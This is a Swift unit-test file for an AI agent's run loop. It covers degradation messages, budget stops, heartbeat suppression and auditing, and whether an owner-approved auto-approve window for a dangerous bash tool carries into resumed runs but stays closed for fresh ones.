  @Test func snapshotFailureAfterPickupFailsRunAndEnqueuesContextDegradation() async throws {
    // given
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "must not call provider")),
      sessionMessagesForRunner: SnapshotFailingSessionMessages()
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(await env.provider.callCount == 0)
    #expect(try latestRunState(env.queue) == RunState.failed.rawValue)
    let pending = try env.outbox.pendingOutbound()
    #expect(pending.map(\.payload) == [Degradation.contextUnavailable])
  }

  @Test func ownerNoticesArePrefixedToDegradedOutboxPayload() async throws {
    // given
    let noticeFile = LoadedFile(outcome: .overCap, text: "", graphemeCount: 2_201)
    let contextBuilder = try makeContextBuilder(
      workspace: TurnRunnerWorkspace(memoryFile: noticeFile)
    )
    let env = try makeEnv(
      agentOutcome: .fail(.terminal(status: 400, message: "bad request")),
      contextBuilder: contextBuilder
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    let pending = try env.outbox.pendingOutbound()
    let firstPending = try #require(pending.first)
    #expect(firstPending.payload.contains("`MEMORY.md` is 2201/2200"))
    #expect(firstPending.payload.contains(Degradation.providerUnavailable))
  }

  @Test func ownerNoticesArePrefixedToBudgetStoppedOutboxPayload() async throws {
    // given
    let stoppingBudget = RunBudget(
      maxInputTokens: RunBudget.default.maxInputTokens,
      maxOutputTokens: RunBudget.default.maxOutputTokens,
      wallClockDeadlineSeconds: RunBudget.default.wallClockDeadlineSeconds,
      retryBudget: RunBudget.default.retryBudget,
      perRunUSD: RunBudget.default.perRunUSD,
      perDayUSD: RunBudget.default.perDayUSD,
      proactivePerDayUSD: RunBudget.default.proactivePerDayUSD,
      referenceUSDPerToken: RunBudget.default.referenceUSDPerToken,
      dayTokenCeilingOverride: 1
    )
    let noticeFile = LoadedFile(outcome: .overCap, text: "", graphemeCount: 2_201)
    let contextBuilder = try makeContextBuilder(
      workspace: TurnRunnerWorkspace(memoryFile: noticeFile)
    )
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "must not call provider")),
      contextBuilder: contextBuilder,
      budget: stoppingBudget
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(await env.provider.callCount == 0)
    let pending = try env.outbox.pendingOutbound()
    let firstPending = try #require(pending.first)
    #expect(firstPending.payload.contains("`MEMORY.md` is 2201/2200"))
    #expect(firstPending.payload.contains(Degradation.budget(cap: "per-day token")))
  }

  @Test func heartbeatAckCommitsWithNoOutboxRowsAndAuditsSuppressed() async throws {
    // given — a heartbeat-origin run whose whole result is the ack token
    let env = try makeEnv(agentOutcome: .respond(okResponse(content: "HEARTBEAT_OK")))
    try await env.queue.write { db in
      try db.execute(
        sql: "UPDATE runs SET origin = 'heartbeat' WHERE id = ?",
        arguments: [env.runId]
      )
    }

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then — DONE with ZERO outbox rows; suppressed audited on the same commit path
    #expect(try latestRunState(env.queue) == "DONE")
    #expect(try env.outbox.pendingOutbound().isEmpty)
    let counts = try heartbeatAuditCounts(env.queue)
    #expect(counts.suppressed == 1)
    #expect(counts.fired == 0)
  }

  @Test func substantiveHeartbeatResultDeliversAndAuditsFired() async throws {
    // given — the token plus a 400-char report: remainder > 300 ⇒ deliver
    let report = "HEARTBEAT_OK\n" + String(repeating: "a", count: 400)
    let env = try makeEnv(agentOutcome: .respond(okResponse(content: report)))
    try await env.queue.write { db in
      try db.execute(
        sql: "UPDATE runs SET origin = 'heartbeat' WHERE id = ?",
        arguments: [env.runId]
      )
    }

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then — delivered like any run, plus the heartbeatFired marker
    #expect(try latestRunState(env.queue) == "DONE")
    let pending = try env.outbox.pendingOutbound()
    #expect(pending.count == 1)
    #expect(pending.first?.payload.contains("HEARTBEAT_OK") == true)
    let counts = try heartbeatAuditCounts(env.queue)
    #expect(counts.suppressed == 0)
    #expect(counts.fired == 1)
  }

  @Test func interactiveRunsAreNeverSuppressedEvenForTheToken() async throws {
    // given — the same token content on the DEFAULT interactive origin
    let env = try makeEnv(agentOutcome: .respond(okResponse(content: "HEARTBEAT_OK")))

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then — delivered; no heartbeat audit rows of either kind
    #expect(try env.outbox.pendingOutbound().count == 1)
    let counts = try heartbeatAuditCounts(env.queue)
    #expect(counts.suppressed == 0)
    #expect(counts.fired == 0)
  }

  @Test func resumeCarriesTheRunsOpenAutoApproveWindowIntoDispatch() async throws {
    // given — a run the owner approved with the turn-scoped window, resuming into a tool call
    let fixedNow = Date(timeIntervalSince1970: 1_700_000_000)
    let definition = ToolDefinition(
      name: "bash",
      description: "d",
      parameters: .object(["type": .string("object")]),
      metadataProvenance: .trusted,
      egressClass: .none,
      riskLevel: .dangerous,
      requiresInteractiveRun: true
    )
    let dispatcher = ScriptedDispatcher(definitions: [definition], respond: okOutcome())
    let env = try makeEnv(
      agentOutcome: .respond(
        toolCallResponse([ToolCall(id: "b1", name: "bash", argumentsJSON: "{}")])
      ),
      toolDispatcher: dispatcher,
      now: { fixedNow }
    )
    let observationMessageId = try await suspendOnAGatedFetchThenApprove(env: env, now: fixedNow)
    let runs = RunStoreGRDB(writer: env.queue)
    #expect(try runs.openAutoApproveWindow(runId: env.runId, now: fixedNow))

    // when
    await env.runner.resume(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      contextBoundMessageId: observationMessageId
    )

    // then — the durable window reached the gate's inputs, so the turn's later host calls widen
    #expect(await dispatcher.records.first?.context.autoApproveWindowOpen == true)
  }

  @Test func aFreshRunDispatchesWithTheWindowClosed() async throws {
    // given — a pick-up carries no approval of its own, so nothing may ride a window
    let definition = ToolDefinition(
      name: "bash",
      description: "d",
      parameters: .object(["type": .string("object")]),
      metadataProvenance: .trusted,
      egressClass: .none,
      riskLevel: .dangerous,
      requiresInteractiveRun: true
    )
    let dispatcher = ScriptedDispatcher(definitions: [definition], respond: okOutcome())
    let env = try makeEnv(
      agentOutcome: .respond(
        toolCallResponse([ToolCall(id: "b1", name: "bash", argumentsJSON: "{}")])
      ),
      toolDispatcher: dispatcher
    )

    // when
    try await env.runner.run(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      triggerMessageId: env.triggerMessageId
    )

    // then
    #expect(await dispatcher.records.first?.context.autoApproveWindowOpen == false)
  }

  @Test func scheduledRunResumesUnderTheProactivePromptWithoutRecall() async throws {
    // given — a scheduled-origin run suspended on a gated fetch, its partial exchange persisted
    // through the real store choreography an approval resume replays (commit → claim → fill)
    let fixedNow = Date(timeIntervalSince1970: 1_700_000_000)
    let env = try makeEnv(
      agentOutcome: .respond(okResponse(content: "Fetched and summarized.")),
      now: { fixedNow }
    )
    let observationMessageId = try await suspendOnAGatedFetchThenApprove(
      env: env,
      origin: .scheduled,
      now: fixedNow
    )

    // when — the owner's approval claimed and filled the observation, so the run resumes
    await env.runner.resume(
      runId: env.runId,
      sessionId: env.sessionId,
      chatId: env.chatId,
      contextBoundMessageId: observationMessageId
    )

    // then — the resume assembled under the proactive prompt (no /schedule token), replayed THIS
    // run's partial exchange (a .tool-role message), and skipped recall
    #expect(try latestRunState(env.queue) == RunState.done.rawValue)
    let resumeRequest = try #require(await env.provider.requests.last)
    let resumeSystem = try #require(resumeRequest.messages.first?.content.text)
    #expect(resumeRequest.messages.first?.role == .system)
    #expect(resumeSystem.contains("started by your own scheduler"))
    #expect(resumeSystem.contains("/schedule") == false)
    #expect(
      resumeRequest.messages.contains { message in
        message.role == .tool
      }
    )
    #expect(
      resumeRequest.messages.contains { message in
        message.content.text.contains("label=\"recall\"")
      } == false
    )
  }

  private func heartbeatAuditCounts(
    _ queue: DatabaseQueue
  ) throws -> (suppressed: Int, fired: Int) {
    try queue.read { db in
      let suppressed =
        try Int.fetchOne(
          db,
          sql: "SELECT COUNT(*) FROM audit_events WHERE action = 'heartbeat_suppressed'"
        ) ?? 0
      let fired =
        try Int.fetchOne(
          db,
          sql: "SELECT COUNT(*) FROM audit_events WHERE action = 'heartbeat_fired'"
        ) ?? 0
      return (suppressed, fired)
    }
  }
}
